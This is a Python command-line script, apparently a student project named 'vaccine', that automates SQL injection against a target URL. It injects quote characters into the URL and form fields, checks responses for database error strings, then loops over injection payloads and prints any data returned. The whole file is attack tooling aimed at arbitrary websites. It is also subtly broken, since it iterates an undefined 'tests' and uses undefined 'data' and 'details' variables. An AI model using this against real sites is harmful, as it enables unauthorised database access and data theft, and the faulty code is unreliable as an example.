
import requests
import argparse
from bs4 import BeautifulSoup
import os
from urllib.parse import urljoin
from pprint import pprint
from payloads import payloads
from errors import errors

requests_types = ["GET", "POST", "PUT", "DELETE", "TRACE", "OPTIONS", "CONNECT", "PATCH"]

s = requests.Session()

def parse_arguments():
    parser = argparse.ArgumentParser(description="perform SQL injection by providing a url as a parameter")
    parser.add_argument('-o', "--file", type=str, action="store", help="Archive file, if not specified it will be stored in './vaccine_results.txt'")
    parser.add_argument('-X', "--request", type=str, action="store", help="Type of request, if not specified GET will be used")
    parser.add_argument('-c', "--cookies", type=str, action="store", help="Cookie of the sesion in case it is needed")
    parser.add_argument('-u', "--user", type=str, action="store", help="User-Agent of the client")
    parser.add_argument('url', type=str, nargs=1, help="Url of the potentialy vulnerable page")
    arg = parser.parse_args()
    if not arg.request:
        arg.request = "GET"
    else:
        if arg.request not in requests_types:
            print(f"Request type must be:{requests_types}")
            exit()
    if not arg.file:
        arg.file = "./vaccine_results.txt"
    if arg.user:
        s.headers['User-Agent'] = arg.user
    else:
        s.headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
    if arg.cookies:
        try:
            cookie = arg.cookies.split("=")
            s.cookies.set(cookie[0], cookie[1])
        except:
            print("Cookies must be: <name>=<value>")
            exit()
    return arg

def get_forms(url):
    soup = BeautifulSoup(s.get(url).content, "html.parser")
    return soup.find_all("form")

def form_details(form):
    details_of_form = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for tag in form.find_all("input"):
        type = tag.attrs.get("type", "text")
        name = tag.attrs.get("name")
        value = tag.attrs.get("value", "")
        inputs.append({
            "type" : type,
            "name": name,
            "value": value
        })
    details_of_form['action'] = action
    details_of_form['method'] = method
    details_of_form['inputs'] = inputs
    return details_of_form

def vulnerable(response):
    #manipulate the dictionary
    for error in errors:
        try:
            if error in response.content.decode().lower():
                return True
        except:
            if error in response.content.decode("Latin-1").lower():
                return True
    return False

def payload(url, data, details):
    #manipulate the payloads dictionary
    flag = 0
    for key, value in data.items():
        if flag == 1:
            flag = 0
            break
        for i in tests:
            data[key] = i
            res = None
            if details["method"] == "post":
                 res = s.post(url, data=data)
            elif details["method"] == "get":
                 res = s.get(url, params=data)
            if not vulnerable(res) and res is not None:
                soup = BeautifulSoup(res.content.decode(), 'html.parser')
                pre = soup.find_all('pre')
                if len(pre) != 0:
                    print("[+] Form:")
                    pprint(pre)
                    print()
                    flag = 1
        
def sql_injection(url):
    for i in "\"'":
        new_url = f"{url}{i}"
        print("[!] Trying", new_url)
        res = s.get(new_url)
        if vulnerable(res):
            print("[+] SQL Injection vulnerability detected, link:", new_url)
            payload(url, data, details)
            return
    
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}")
    for form in forms:  
        details = form_details(form)
        for i in "\"'":    
            data = {}
            for tag in details["inputs"]:
                if tag["type"] == "hidden" or tag["value"]:
                    # any input form that is hidden or has some value,
                    # just use it in the form body
                    data[tag["name"]] = tag["value"] + i
                elif tag["type"] != "submit":
                    # all others except submit, use some junk data with special character
                    data[tag["name"]] = f"test{i}"
            res = None
            #url = urljoin(url, details["action"])
            if details["method"] == "post":
                res = s.post(url, data=data)
            elif details["method"] == "get":
                res = s.get(url, params=data)
            if vulnerable(res) and res is not None:
                print("[+] SQL Injection vulnerability detected, link:", url)
                payload(url, data, details)
                return
    print("[x] No SQL Injection detected, link:", url)
                
if __name__ == "__main__":
    arg = parse_arguments()

    sql_injection(arg.url)

    
